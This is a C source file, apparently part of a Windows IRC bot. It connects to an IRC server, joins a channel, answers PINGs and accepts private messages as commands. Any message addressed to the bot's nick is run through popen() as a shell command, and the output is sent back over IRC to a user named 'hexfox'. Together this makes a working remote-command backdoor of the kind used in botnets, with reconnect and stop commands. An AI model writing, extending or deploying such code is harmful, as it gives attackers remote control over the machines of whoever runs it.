#include "functions.h"

SOCKET createSocket(char * host_irc, unsigned short port_irc)
{
    SOCKET _socket;
    WSADATA wsa_data;
    struct hostent *host;
    struct sockaddr_in sock_addr;

    //initialise Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
    {
        printf("WSA Initialization failed!\n");
        WSACleanup();
        return 0;
    }

    //resolve IP address for hostname
    if ((host = gethostbyname(host_irc)) == NULL)
    {
        printf("Failed to resolve hostname!\n");
        WSACleanup();
        return 0;
    }

    //setup our socket address structure
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = htons(port_irc);
    sock_addr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

    if ((_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
    {
        printf("Socket creation failed!\n");
        WSACleanup();
        return 0;
    }

    //attempt to connect to server
    if (connect(_socket, (struct sockaddr*)(&sock_addr), sizeof(sock_addr)) != 0)
    {
        printf("Failed to establish connection with server!\n");
        WSACleanup();
        return 0;
    }

    return _socket;
}

void deleteSocket(SOCKET _socket)
{
    shutdown(_socket, SD_SEND);	//shutdown our socket
    closesocket(_socket);       //close our socket entirely
    WSACleanup();               //cleanup Winsock
}



//send user and nick to irc host
void sendUserNick(  SOCKET _socket,
                    struct nickname *nicknm,
                    struct vars_messages *vars_msg)
{
    char    name[SIZE_STR],
            tmp_1[SIZE_STR], tmp_2[SIZE_STR],
            tmp_3[SIZE_STR], tmp_4[SIZE_STR],
            tmp_5[SIZE_STR];

    char *msg_nick_name =
            (char *)malloc(strlen(nicknm->prefix_name)
                           + strlen(nicknm->prefix_nick) + 128);
    srand((unsigned int)time(0));
    sprintf(msg_nick_name, "USER %s%d 0 * :%s\nNICK %s%d\n",
            nicknm->prefix_name, rand(), nicknm->bot_name,
            nicknm->prefix_nick, rand());
    sscanf(msg_nick_name, "%s%s%s%s%s%s%s",
           tmp_1, name, tmp_2, tmp_3, tmp_4, tmp_5, vars_msg->nick);
    send(_socket, msg_nick_name, (int)strlen(msg_nick_name), 0);
    printf("%s", msg_nick_name);
    free(msg_nick_name);
}

//join to channel
void joinToChannel(SOCKET _socket,
                   struct buffers *buffs,
                   struct commands *cmds
                   )
{
    if (strstr(buffs->from, "/MOTD") || strstr(buffs->from, "MODE"))
    {
        send(_socket, cmds->join, (int)strlen(cmds->join), 0);
        printf("%s", cmds->join);
    }
}

//for stay on a server we play the game ping pong with server
boolean pingPong(SOCKET _socket,
              struct buffers *buff,
              struct commands *cmds
              )
{
    unsigned int len_cmd_pong = strlen(cmds->pong);
    if(!strncmp ("PING", buff->from, 4))
    {
        printf("%s", buff->from);
        cmds->ping = (char *)malloc(strlen(buff->from) + len_cmd_pong);
        buff->from_sub = strchr(buff->from, ':');
        ++buff->from_sub;
        sprintf(cmds->ping, "%s%s", cmds->pong, buff->from_sub);
        printf("%s", cmds->ping);
        send(_socket, cmds->ping, (int)strlen(cmds->ping), 0);
        free (cmds->ping);
        return TRUE;
    }
    return  FALSE;
}



//if parsing cmd from server and nicks equally
enum FlagsCommandRemoteUser commandFromRemoteUser(SOCKET _socket,
                           struct buffers *buffs,
                           struct commands *cmds,
                           struct vars_messages *vars_msgs
                           )
{
    FILE *io_buff;
    if(!strcmp(vars_msgs->srvcmd, "PRIVMSG")
            && !strcmp(vars_msgs->snick, vars_msgs->nick))
    {
        /*
            read data after second char ':'
            full string ->
            [ userfrom@ip servercmd userto : {command param ...}
             (this subsrtring is write to var - pcmd) ]
        */
        cmds->cmd = (char *)malloc(strlen(buffs->from));
        cmds->cmd = buffs->from;
        while(cmds->cmd[1] != ':')
        {
            cmds->cmd++;
        }
        cmds->cmd+=2;

        //command for reconnect server
        if (strstr(cmds->cmd, "!change"))
        {
            send(_socket, cmds->part, (int)strlen(cmds->part), 0);
            send(_socket, cmds->quit, (int)strlen(cmds->quit), 0);
            return Reconnect;
        }
        //command for stopping bot
        if (strstr(cmds->cmd, "!stop"))
        {
            return Stopped;
        }

        io_buff = popen(cmds->cmd, "rt");
        printf("%s", cmds->cmd);

        //send result of command
        while(fgets(buffs->tmp, sizeof(buffs->tmp), io_buff))
        {
            strcpy(buffs->to, "PRIVMSG hexfox :");
            strcat(buffs->to, buffs->tmp);
            send(_socket, buffs->to, (int)strlen(buffs->to), 0);
        }

        memset(buffs->to, 0, sizeof(buffs->to));
        memset(buffs->tmp, 0, sizeof(buffs->tmp));
    }
    else
    {
        printf("%s", buffs->from);
        return NotPrivMsg;
    }

    return PrivMsg;
}
